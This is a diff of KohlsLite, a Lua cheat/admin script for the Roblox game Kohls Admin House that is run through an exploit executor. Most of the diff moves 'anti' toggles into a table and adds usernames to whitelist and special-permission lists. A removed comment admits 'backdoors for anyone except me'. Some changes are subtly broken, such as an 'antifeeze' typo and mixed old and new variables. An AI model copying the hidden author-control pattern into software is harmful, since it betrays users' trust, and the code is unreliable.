@@ -1,19 +1,22 @@
--- KohlsLite v2 is being developed, this script will not be updated that much (sorry for no part builder/good vis and not fixing ncontrol) --
+-- This script is not discontinued but is currently dormant. Ncontrol and antifling will be added during summer holidays
+-- This script will not be updated that much (sorry for no part builder/good vis and not fixing ncontrol) --
 
 --[[
- _  _____  _   _ _     ____  _     ___ _____ _____ 
-| |/ / _ \| | | | |   / ___|| |   |_ _|_   _| ____|
-| ' / | | | |_| | |   \___ \| |    | |  | | |  _|  
-| . \ |_| |  _  | |___ ___) | |___ | |  | | | |___ 
-|_|\_\___/|_| |_|_____|____/|_____|___| |_| |_____| v1.58 ]]
+░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       ░▒▓███████▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░        
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓██████▓▒░   
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓████████▓▒░ v1.64 ]]
 
 -- This free, open-source script is for the Roblox game Kohls Admin House (KAH)
 -- You can play KAH here: https://www.roblox.com/games/112420803/Kohls-Admin-House-NBC-Updated
--- Created by ScriptingProgrammer (Roblox) / TS2021x (Discord) / S-PScripts (GitHub)
+-- Created by ScriptingProgrammer (Roblox) / ts2021x (Discord) / S-PScripts (GitHub)
 
--- There are no watermarks anymore in this script and there are no longer backdoors for anyone except me ;)
+-- There are no more watermarks in this script.
 
--- Support this script today by donating Robux to me (especially since this script has limited advertising now)
+-- Support this script today by donating Robux to me on Roblox (especially since this script has limited advertising now)
 -- Please do not "skid" off this code by removing the dev section. It makes me annoyed!
 -- You can make your own script instead of skidding and you can take stuff from here if necessary.
 
@@ -24,7 +27,7 @@
 -- Notifications
 local function Remind(msg)
         game.StarterGui:SetCore("SendNotification", {
-                Title = "KohlsLite v1 (OLD)",
+                Title = "KohlsLite v1",
                 Text = msg,
                 Duration = 1
         })
@@ -40,7 +43,7 @@ end
 if not game:IsLoaded() then
     local notLoaded = Instance.new("Message")
     notLoaded.Parent = game:GetService("CoreGui")
-    notLoaded.Text = "KohlsLite is waiting for the game to load"
+    notLoaded.Text = "KohlsLite is waiting for the game to load..."
     game.Loaded:Wait()
     notLoaded:Destroy()
 end
@@ -71,7 +74,7 @@ getgenv().kohlsexecuted = true
 getgenv().deprefix = "." 
 
 -- The version of KohlsLite
-getgenv().klversion = "1.58"
+getgenv().klversion = "1.64"
 
 -- Chat function
 local function Chat(msg)
@@ -83,7 +86,7 @@ local function Speak(msg)
     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
 end
 
--- Prefix cheker
+-- Prefix checker
 if getgenv().theprefix then
 	prefix = getgenv().theprefix
 else
@@ -91,7 +94,8 @@ else
 end
 
 -- Defaults (you can change these)
-local defaults = {".antirocket me", ".tnok"} --".antimsg me"
+local defaults = {".antirocket me", ".tnok", ".iy"} --".antimsg me"
+-- When executing IY after KohlsLite, KL breaks. I'll fix the handler when i get time
 
 -- Misc variables (ignore these)
 local bending -- ignore
@@ -195,7 +199,8 @@ local pwl = {
     "grimAuxiliatrix",
     "ikbx",
     "undertaker629",
-    "Eggkid7"
+    "Eggkid7",
+    "4g8h"
 }
 
 -- Players you cannot kick
@@ -239,17 +244,31 @@ local nokick = {
     "undertaker629",
     "Eggkid7",
     "s_pisafurry", 
-    "YT_MATHEUSMODZ5"
+    "YT_MATHEUSMODZ5",
+    "4g8h"
 }
 
--- Players with special perms
+-- Players with special perms [collaborators of KL]
 local specialperms = {
     "me_123eq",
     "me_crashking",
     "ScriptingProgrammer",
+    "atprog",
     "s_pisafurry",
     "dawninja21",
-    "dawninja21alt"
+    "dawninja21alt",
+    "D_ionte",
+    "4g8h"
+}
+
+-- atprog spexialpermz
+local atprogperms = {
+    "atprog",
+    "IceStuds",
+    "decryptionites",
+    "ripcxo",
+    "grimAuxiliatrix",
+    "undertaker629"
 }
 
 -- New users get blacklisted (prevent crashers)
@@ -302,7 +321,8 @@ local pgwl = {
     "grimAuxiliatrix",
     "ikbx",
     "undertaker629",
-    "Eggkid7"
+    "Eggkid7",
+    "4g8h"
 }
 
 -- Serverlock
@@ -949,7 +969,7 @@ local flykeybind = "f" -- fly keybind
 
 -- Auto things when people join
 local autogpcheck = true -- automatically check for player's gamepasses
-local autogb = false
+local autogb = false -- auto gear ban
 
 -- Clicking
 local clickexplode = false -- yeah
@@ -972,13 +992,13 @@ local loopgrab = false
 local loopgrab2 = false
 
 -- Antis
-local anticrash = true
-local anticrash2 = false
+local anticrash = false
 local antigear = false
-local antigear2 = false
 local antigb = true
 local antipaint = false
 local antiattach2 = false
+
+local emranticrash = true
 
 -- Antis (workspace)
 local antiflash = false
@@ -987,7 +1007,6 @@ local antifogend = false
 local antichat = false
 local antiattach = false
 local noblt = false
-local YOUantigs = false
 
 -- Gojo server lock
 local gjdelock = false
@@ -1019,7 +1038,7 @@ Remind("Thank you for using KohlsLite. The version you are using is v"..getgenv(
 print("Say .kcmds to list some of the commands. DM me at ts2021x for help.")
 Remind("Say .kcmds to list some of the commands. DM me at ts2021x for help.")
 
---Chat("h \n\n\n Executed! Version: "..getgenv().klversion.." \n\n\n") -- i finally changed it xd
+Chat("h \n\n\n KohlsLite executed! Version: "..getgenv().klversion.." \n\n\n")
 
 print("\n\n\n")
 print("- Perm check -")
@@ -2103,91 +2122,12 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
     end
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiabuse' then
-        Remind("Most antis are ON!")
-                        antiattach = true
-                        antidisco = true
-                        antiflash = true
-                        antifogend = true
-                        antifogstart = true
-                        antifogcolor = true
-                        antitime = true
-                        antiambient = true
-                        antibrightness = true
-                        antioutamb = true
-                        YOUantiblind = true
-                        YOUantigs = true
-                        YOUantiaddon, ALLantiaddon = true, true
-                        YOUanticlone, ALLanticlone = true, true
-                        YOUantidog, ALLantidog = true, true
-                        YOUantifire, ALLantifire = true, true
-                        YOUantifreeze, ALLantifreeze = true, true
-                        YOUantifly, ALLantifly = true, true
-                        YOUantiff, ALLantiff = true, true
-                        YOUantiglow, ALLantiglow = true, true
-                        YOUantihealthc, ALLantihealthc = true, true
-                        YOUantijail, ALLantijail = true, true
-                        YOUantijump, ALLantijump = true, true
-                        YOUantikill, ALLantikill = true, true
-                        YOUantimsg = true
-                        YOUantinoclip = true
-                        YOUantiname, ALLantiname = true, true
-                        YOUantichar, ALLantichar = true, true
-                        YOUantiparticles, ALLantiparticles = true, true
-                        YOUantipunish, ALLantipunish = true, true
-                        YOUantirocket, ALLantirocket = true, true
-                        YOUantisit, ALLantisit = true, true
-                        YOUantiseizure, ALLantiseizure = true, true
-                        YOUantismoke, ALLantismoke = true, true
-                        YOUantisparkles, ALLantisparkles = true, true
-                        YOUantispeed, ALLantispeed = true, true
-                        YOUantispin, ALLantispin = true, true
-                        YOUantistun, ALLantistun = true, true
-                        YOUantisetgrav, ALLantisetgrav = true, true
-                        YOUantiswag, ALLantiswag = true, true
+        Remind("WIP")
 
     end
 
     if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiabuse' then
-        Remind("Most antis are OFF!")
-                        antiattach = false
-                        antidisco = false
-                        antiflash = false
-                        antifogend = false
-                        antifogstart = false
-                        antifogcolor = false
-                        antitime = false
-                        antiambient = false
-                        antibrightness = false
-                        antioutamb = false
-                        YOUantiblind = false
-                        YOUantigs = false
-                        YOUantiaddon, ALLantiaddon = false, false
-                        YOUanticlone, ALLanticlone = false, false
-                        YOUantifire, ALLantifire = false, false
-                        YOUantifreeze, ALLantifreeze = false, false
-                        YOUantifly, ALLantifly = false, false
-                        YOUantiff, ALLantiff = false, false
-                        YOUantiglow, ALLantiglow = false, false
-                        YOUantihealthc, ALLantihealthc = false, false
-                        YOUantijail, ALLantijail = false, false
-                        YOUantijump, ALLantijump = false, false
-                        YOUantikill, ALLantikill = false, false
-                        YOUantimsg = false
-                        YOUantinoclip = false
-                        YOUantiname, ALLantiname = false, false
-                        YOUantichar, ALLantichar = false, false
-                        YOUantiparticles, ALLantiparticles = false, false
-                        YOUantipunish, ALLantipunish = false, false
-                        YOUantirocket, ALLantirocket = false, false
-                        YOUantisit, ALLantisit = false, false
-                        YOUantiseizure, ALLantiseizure = false, false
-                        YOUantismoke, ALLantismoke = false, false
-                        YOUantisparkles, ALLantisparkles = false, false
-                        YOUantispeed, ALLantispeed = false, false
-                        YOUantistun, ALLantistun = false, false
-                        YOUantisetgrav, ALLantisetgrav = false, false
-                        YOUantiswag, ALLantiswag = false, false
-
+        Remind("WIP")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'bok' then
@@ -4894,25 +4834,25 @@ Commands required: rocket]])
 	Remind("Anti crash is now disabled.")
     end
 
-    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antigs' then -- what is this??
-        YOUantigs = true
+   if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'emranticrash' then
+        emranticrash = true
+	Remind("EMR Anti crash is now enabled.")
+    end
+
+    if string.sub(msg:lower(), 1, #prefix + 16) == prefix..'unemranticrash' then
+        emranticrash = false
+	Remind("EMR Anti crash is now disabled.")
+    end
+
+    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antigs' then -- what is this?
+        antis.antigrayscale = true
 	Remind("Enabled this anti!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantigs' then 
-        YOUantigs = false
+        antis.antigrayscale = false
 	Remind("Disabled this anti!")
-    end
-		
-    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'2anticrash' then
-        anticrash2 = true
-	Remind("Anti crash 2 is now enabled.")
-    end
-
-    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'2unanticrash' then
-        anticrash2 = false
-	Remind("Anti crash 2 is now disabled.")
-    end
+    end	   
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antipaint' then
         antipaint = true
@@ -4932,16 +4872,6 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantigear' then
         antigear = false
 	Remind("Anti gear is now disabled.")
-    end
-
-    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'2antigear' then
-        antigear2 = true
-	Remind("Anti gear 2 is now enabled.")
-    end
-
-    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'2unantigear' then
-        antigear2 = false
-	Remind("Anti gear 2 is now disabled.")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antigb' then
@@ -5054,19 +4984,19 @@ Commands required: rocket]])
     end
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiblind' then
-        YOUantiblind = true
+        antis.antiblind = true
 	Remind("Turned this anti on for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiblind' then
-        YOUantiblind = false
+        antis.antiblind = false
 	Remind("Turned this anti off for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiaddon' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiaddon = true
+                antis.antiaddon = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantiaddon = true
@@ -5083,7 +5013,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiaddon' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiaddon = false
+                antis.antiaddon = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantiaddon = false
@@ -5100,7 +5030,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'anticlone' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUanticlone = true
+                antis.anticlone = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLanticlone = true
@@ -5117,7 +5047,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unanticlone' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUanticlone = false
+                antis.anticlone = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLanticlone = false
@@ -5134,7 +5064,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antidog' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantidog = true
+                antis.antidog = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantidog = true
@@ -5151,7 +5081,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantidog' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantidog = false
+                antis.antidog = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantidog = false
@@ -5168,7 +5098,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antifire' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantifire = true
+                antis.antifire = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantifire = true
@@ -5185,7 +5115,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantifire' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantifire = false
+                antis.antifire = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantifire = false
@@ -5202,7 +5132,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antifreeze' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantifreeze = true
+                antis.antifeeze = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantifreeze = true
@@ -5219,7 +5149,7 @@ Commands required: rocket]])
    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantifreeze' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantifreeze = false
+                antis.antifreeze = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantifreeze = false
@@ -5236,7 +5166,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antiff' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiff = true
+                antis.antiff = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantiff = true
@@ -5253,7 +5183,7 @@ Commands required: rocket]])
   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantiff' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiff = false
+                antis.antiff = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantiff = false
@@ -5270,7 +5200,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiglow' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiglow = true
+                antis.antiglow = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantiglow = true
@@ -5287,7 +5217,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiglow' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiglow = false
+                antis.antiglow = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantiglow = false
@@ -5304,7 +5234,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antihc' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantihealthc = true
+                antis.antihealthchange = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantihealthc = true
@@ -5321,7 +5251,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantihc' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantihealthc = false
+                antis.antihealthchange = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantihealthc = false
@@ -5338,7 +5268,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antijail' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantijail = true
+                antis.antijail = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantijail = true
@@ -5355,7 +5285,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantijail' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantijail = false
+                antis.antijail = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantijail = false
@@ -5372,7 +5302,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antijump' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantijump = true
+                antis.antijump = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantijump = true
@@ -5389,7 +5319,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantijump' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantijump = false
+                antis.antijump = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantijump = false
@@ -5407,7 +5337,7 @@ Commands required: rocket]])
         local args = string.split(msg, " ")
 	if #args == 2 then
         	if args[2] == "me" then
-                	YOUantikill = true
+                	antis.antikill = true
                 	Remind("Turned this anti on for you!")
         	elseif args[2] == "others" then
                 	ALLantikill = true
@@ -5439,7 +5369,7 @@ Commands required: rocket]])
         local args = string.split(msg, " ")
         if #args == 2 then
         	if args[2] == "me" then
-                	YOUantikill = false
+                	antis.antikill = false
                 	Remind("Turned this anti off for you!")
         	elseif args[2] == "others" then
                 	ALLantikill = false
@@ -5470,7 +5400,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antifly' then -- forgot to add this to the list lmao
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantifly = true
+                antis.antifly = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantifly = true
@@ -5487,7 +5417,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantifly' then -- forgot to add this to the list lmao
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantifly = false
+                antis.antifly = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantifly = false
@@ -5502,19 +5432,19 @@ Commands required: rocket]])
     end
 
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antinoc' then -- yes
-                YOUantinoclip = true
+                antis.antinoclip = true
                 Remind("Turned this anti on for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantinoc' then -- yes
-                YOUantinoclip = false
+                antis.antinoclip = false
                 Remind("Turned this anti off for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antichar' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantichar = true
+                antis.antichar = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantichar = true
@@ -5531,7 +5461,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantichar' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantichar = false
+                antis.antichar = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantichar = false
@@ -5546,12 +5476,12 @@ Commands required: rocket]])
     end
 
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antimsg' then
-        YOUantimsg = true
+        antis.antimessage = true
         Remind("Turned this anti on for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantimsg' then
-        YOUantimsg = false
+        antis.antimessage = false
         Remind("Turned this anti off for you!")
     end
 
@@ -5566,29 +5496,29 @@ Commands required: rocket]])
     end
 
   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antivoid' then
-        YOUantivoid = true
+        antis.antivoid = true
         Remind("Turned this anti on for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantivoid' then
-        YOUantivoid = false
+        antis.antivoid = false
         Remind("Turned this anti off for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antisky' then
-        YOUantisky = true
+        antis.antiskydive = true
         Remind("Turned this anti on for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantisky' then
-        YOUantisky = false
+        antis.antiskydive = false
         Remind("Turned this anti off for you!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiname' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiname = true
+                antis.antiname = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantiname = true
@@ -5605,7 +5535,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiname' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiname = false
+                antis.antiname = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantiname = false
@@ -5622,7 +5552,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'antiparticles' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiparticles = true
+                antis.antiparticles = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantiparticles = true
@@ -5639,7 +5569,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 15) == prefix..'unantiparticles' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiparticles = false
+                antis.antiparticles = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantiparticles = false
@@ -5656,7 +5586,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antipunish' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantipunish = true
+                antis.antipunish = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantipunish = true
@@ -5673,7 +5603,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantipunish' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantipunish = false
+                antis.antipunish = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantipunish = false
@@ -5690,7 +5620,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antirocket' then
          local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantirocket = true
+                antis.antirocket = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantirocket = true
@@ -5699,6 +5629,23 @@ Commands required: rocket]])
                 YOUantirocket = true
                 ALLantirocket = true
                 Remind("Turned this anti on for everyone!")
+        else
+                Remind("Invalid argument: Must be me, others, or all")
+        end             
+    end
+
+    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantirocket' then
+         local args = string.split(msg, " ")
+        if args[2] == "me" then
+                antis.antirocket = false
+                Remind("Turned this anti off for you!")
+        elseif args[2] == "others" then
+                ALLantirocket = false
+                Remind("Turned this anti off for others!")
+        elseif args[2] == "all" then
+                YOUantirocket = false
+                ALLantirocket = false
+                Remind("Turned this anti off for everyone!")
         else
                 Remind("Invalid argument: Must be me, others, or all")
         end             
@@ -5720,27 +5667,10 @@ Commands required: rocket]])
                 antitoolm = false
     end
 
-    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantirocket' then
-         local args = string.split(msg, " ")
-        if args[2] == "me" then
-                YOUantirocket = false
-                Remind("Turned this anti off for you!")
-        elseif args[2] == "others" then
-                ALLantirocket = false
-                Remind("Turned this anti off for others!")
-        elseif args[2] == "all" then
-                YOUantirocket = false
-                ALLantirocket = false
-                Remind("Turned this anti off for everyone!")
-        else
-                Remind("Invalid argument: Must be me, others, or all")
-        end             
-    end
-
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antisit' then
          local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantisit = true
+                antis.antisit = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantisit = true
@@ -5757,7 +5687,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantisit' then
          local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantisit = false
+                antis.antisit = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantisit = false
@@ -5774,7 +5704,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'antiseizure' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiseizure = true
+                antis.antiseizure = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantiseizure = true
@@ -5791,7 +5721,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unantiseizure' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiseizure = false
+                antis.antiseizure = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantiseizure = false
@@ -5808,7 +5738,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antismoke' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantismoke = true
+                antis.antismoke = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantismoke = true
@@ -5825,7 +5755,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantismoke' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantismoke = false
+                antis.antismoke = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantismoke = false
@@ -5842,7 +5772,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'antisparkles' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantisparkles = true
+                antis.antisparkles = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantisparkles = true
@@ -5860,7 +5790,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'unantisparkles' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantisparkles = false
+                antis.antisparkles = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantisparkles = false
@@ -5877,7 +5807,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antispeed' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantispeed = true
+                antis.antispeed = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantispeed = true
@@ -5894,7 +5824,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantispeed' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantispeed = false
+                antis.antispeed = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantispeed = false
@@ -5911,7 +5841,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antispin' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantispin = true
+                antis.antispin = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantispin = true
@@ -5928,7 +5858,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantispin' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantispin = false
+                antis.antispin = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantispin = false
@@ -5945,7 +5875,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antistun' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantistun = true
+                antis.antistun = true
                 Remind("Turned this anti on for you!")
